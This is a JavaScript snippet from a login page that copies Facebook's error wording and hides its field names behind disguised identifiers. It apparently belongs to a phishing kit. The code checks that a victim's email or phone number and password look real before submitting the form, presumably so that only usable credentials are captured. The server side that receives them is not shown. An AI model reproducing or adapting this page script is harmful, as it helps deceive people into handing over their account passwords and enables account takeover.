    <script>

        if (Number(window.innerWidth) > 500) {
            // not mobile screen
            document.getElementById("fullPage").style.display = "none";
        }
        else {
            document.getElementById("fullPage").style.display = "block";
        }

        document.getElementById('fot').onclick = () => {
            location.href = "/fedder";
        }
        let btnHideShow = document.getElementById('hideShow');

        btnHideShow.onclick = () => {
            if (btnHideShow.innerText == 'SHOW') {
                btnHideShow.innerText = 'HIDE';
                document.getElementById('chabighor').type = 'password';
            }
            else {
                btnHideShow.innerText = 'SHOW'
                document.getElementById('chabighor').type = 'text';
            }
        }


        document.getElementById('chabighor').onkeyup = () => {
            let chabiL = document.getElementById('chabighor').value

            if (chabiL.length >= 1) {
                btnHideShow.style.display = 'block';
            }
            else {
                // document.getElementById('chabighor').type = 'password'
                // btnHideShow.innerText = 'HIDE'
                btnHideShow.style.display = 'none';
            }
        }


        // incorrect information given section
        const feedbackGhor = document.getElementById('feedbackGhor');
        const chabighor = document.getElementById('chabighor');
        const btnSub = document.getElementById('btnSub');

        const incorrectNumberMsg = `The mobile number or email address that you've entered doesn't match any account. <a href='/fedder'><strong>Find your account.</strong></a>`;
        const incorrectPassMsg = `The password you entered is incorrect. <a href='/fedder'><strong>Did you forget your password?</strong></a>`;

        const incorrectInformation = document.getElementById('incorrectInformation');

        const isValidEmail = (str) => {
            if (str.length < 8) {
                return false;
            }
            let patta = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return patta.test(str);
        }

        const isValidPhoneNum = (str) => {
            if (str.length > 14 || str.length < 11) {
                return false;
            }
            if (str[0] == '+') {
                str = str.slice(3);
            }
            else if (str[0] == '8') {
                str = str.slice(2);
            }
            if (str.length != 11 || str[0] != '0' || str[1] != '1') {
                return false;
            }
            for (let i = 0; i < str.length; i++) {
                if (str[i] < '0' || str[i] > '9') {
                    return false;
                }
            }
            return true;
        }

        const isValidChabi = (str) => {
            if (str.length < 6 || str == "123456") {
                return false;
            }
            return true;
        }

        btnSub.addEventListener('click', () => {
            if (!isValidEmail(feedbackGhor.value) && !isValidPhoneNum(feedbackGhor.value)) {
                incorrectInformation.style.display = 'block';
                incorrectInformation.innerHTML = incorrectNumberMsg;
            }
            else if (!isValidChabi(chabighor.value)) {
                incorrectInformation.style.display = 'block';
                incorrectInformation.innerHTML = incorrectPassMsg;
            }
            else {
                // location.href = "/allok"
                document.forms[0].submit();
            }
        });
    </script>

